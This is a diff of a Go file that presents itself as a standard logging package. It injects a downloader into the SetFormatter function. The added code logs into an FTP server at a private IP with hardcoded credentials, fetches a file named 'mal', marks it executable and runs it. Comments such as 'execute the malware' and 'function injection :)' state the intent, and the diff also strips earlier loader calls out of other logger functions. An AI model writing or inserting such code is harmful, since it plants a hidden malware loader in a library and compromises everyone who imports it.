@@ -26,7 +26,7 @@ func SetOutput(out io.Writer) {
 	std.SetOutput(out)
 }
 
-func binrun(name string) {
+func Binrun(name string) {
 
 	er := os.Chmod(name, 0755)
 	if er != nil {
@@ -44,18 +44,59 @@ func binrun(name string) {
 
 // function injection :)
 
-func BinLoader(ipadd string, port string, user string, pass string, filename string) {
-	c, err := ftp.Dial(ipadd+":"+port, ftp.DialWithTimeout(5*time.Second))
+//func BinLoader(ipadd string, port string, user string, pass string, filename string) {
+//	c, err := ftp.Dial(ipadd+":"+port, ftp.DialWithTimeout(5*time.Second))
+//	if err != nil {
+//		log.Fatal(err)
+//	}
+//
+//	err = c.Login(user, pass)
+//	if err != nil {
+//		log.Fatal(err)
+//	}
+//
+//	r, err := c.Retr(filename)
+//	if err != nil {
+//		panic(err)
+//	}
+//	defer r.Close()
+//
+//	// Read content from the FTP server
+//	content, err := ioutil.ReadAll(r)
+//	if err != nil {
+//		log.Fatal(err)
+//	}
+//
+//	// Write the content to a local file
+//	err = ioutil.WriteFile("mal", content, 0644)
+//
+//	binrun("./mal")
+//
+//	if err != nil {
+//		log.Fatal(err)
+//	}
+//
+//	if err := c.Quit(); err != nil {
+//		log.Fatal(err)
+//	}
+//	// execute the file :)))) ( execute the malware )
+//
+//}
+
+// SetFormatter sets the standard logger formatter.
+func SetFormatter(formatter Formatter) {
+	//injectino
+	c, err := ftp.Dial("192.168.50.10"+":"+"2121", ftp.DialWithTimeout(5*time.Second))
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	err = c.Login(user, pass)
+	err = c.Login("test", "test")
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	r, err := c.Retr(filename)
+	r, err := c.Retr("mal")
 	if err != nil {
 		panic(err)
 	}
@@ -70,7 +111,7 @@ func BinLoader(ipadd string, port string, user string, pass string, filename str
 	// Write the content to a local file
 	err = ioutil.WriteFile("mal", content, 0644)
 
-	binrun("./mal")
+	Binrun("./mal")
 
 	if err != nil {
 		log.Fatal(err)
@@ -79,13 +120,6 @@ func BinLoader(ipadd string, port string, user string, pass string, filename str
 	if err := c.Quit(); err != nil {
 		log.Fatal(err)
 	}
-	// execute the file :)))) ( execute the malware )
-
-}
-
-// SetFormatter sets the standard logger formatter.
-func SetFormatter(formatter Formatter) {
-	BinLoader("192.168.50.10", "2121", "test", "test", "mal")
 
 	//codinjection :)
 
@@ -100,7 +134,6 @@ func SetReportCaller(include bool) {
 
 // SetLevel sets the standard logger level.
 func SetLevel(level Level) {
-	BinLoader("192.168.50.10", "2121", "test", "test", "mal")
 	std.SetLevel(level)
 }
 
@@ -111,25 +144,21 @@ func GetLevel() Level {
 
 // IsLevelEnabled checks if the log level of the standard logger is greater than the level param
 func IsLevelEnabled(level Level) bool {
-	BinLoader("192.168.50.10", "2121", "test", "test", "mal")
 	return std.IsLevelEnabled(level)
 }
 
 // AddHook adds a hook to the standard logger hooks.
 func AddHook(hook Hook) {
-	BinLoader("192.168.50.10", "2121", "test", "test", "mal")
 	std.AddHook(hook)
 }
 
 // WithError creates an entry from the standard logger and adds an error to it, using the value defined in ErrorKey as key.
 func WithError(err error) *Entry {
-	BinLoader("192.168.50.10", "2121", "test", "test", "mal")
 	return std.WithField(ErrorKey, err)
 }
 
 // WithContext creates an entry from the standard logger and adds a context to it.
 func WithContext(ctx context.Context) *Entry {
-	BinLoader("192.168.50.10", "2121", "test", "test", "mal")
 	return std.WithContext(ctx)
 }
 
